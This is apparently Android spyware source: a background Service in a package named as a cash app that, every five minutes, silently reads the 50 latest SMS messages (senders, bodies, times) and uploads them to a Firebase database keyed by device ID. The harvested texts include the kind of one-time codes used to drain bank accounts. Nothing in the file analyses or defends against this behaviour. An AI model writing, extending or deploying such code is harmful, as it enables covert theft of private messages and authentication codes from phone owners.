package com.my.Refiner.Cash.User;

import android.Manifest;
import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.Telephony;
import android.util.Log;

import androidx.core.content.ContextCompat;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.HashMap;
import java.util.Map;

public class SmsService extends Service {

    private static final String TAG = "SmsService";
    private static final long INTERVAL = 5 * 60 * 1000;

    private Handler handler;
    private DatabaseReference dbRef;
    private String deviceId;
    private boolean isRunning = false;

    @Override
    public void onCreate() {
        super.onCreate();
        handler = new Handler(Looper.getMainLooper());
        dbRef = FirebaseDatabase.getInstance().getReference();
        deviceId = getSharedPreferences("mdm", MODE_PRIVATE)
                .getString("device_id", "unknown");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (!isRunning) {
            isRunning = true;
            sendSms();
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    sendSms();
                    if (isRunning) handler.postDelayed(this, INTERVAL);
                }
            }, INTERVAL);
        }
        return START_STICKY;
    }

    private void sendSms() {
        try {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
                    != PackageManager.PERMISSION_GRANTED) {
                Log.w(TAG, "No SMS permission");
                return;
            }

            Cursor cursor = getContentResolver().query(
                    Telephony.Sms.CONTENT_URI, null, null, null,
                    Telephony.Sms.DATE + " DESC LIMIT 50");

            if (cursor == null) return;

            Map<String, Object> smsMap = new HashMap<>();
            int count = 0;

            while (cursor.moveToNext() && count < 50) {
                String address = cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS));
                String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
                long date = cursor.getLong(cursor.getColumnIndex(Telephony.Sms.DATE));
                int type = cursor.getInt(cursor.getColumnIndex(Telephony.Sms.TYPE));

                Map<String, Object> sms = new HashMap<>();
                sms.put("address", address);
                sms.put("body", body);
                sms.put("type", type == Telephony.Sms.MESSAGE_TYPE_INBOX ? "INBOX" : "SENT");
                sms.put("time", date);

                smsMap.put(String.valueOf(date), sms);
                count++;
            }
            cursor.close();

            dbRef.child("devices").child(deviceId).child("sms").setValue(smsMap)
                    .addOnSuccessListener(aVoid -> Log.d(TAG, "SMS sent: " + count));
        } catch (Exception e) {
            Log.e(TAG, "Error: " + e.getMessage());
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        isRunning = false;
        handler.removeCallbacksAndMessages(null);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
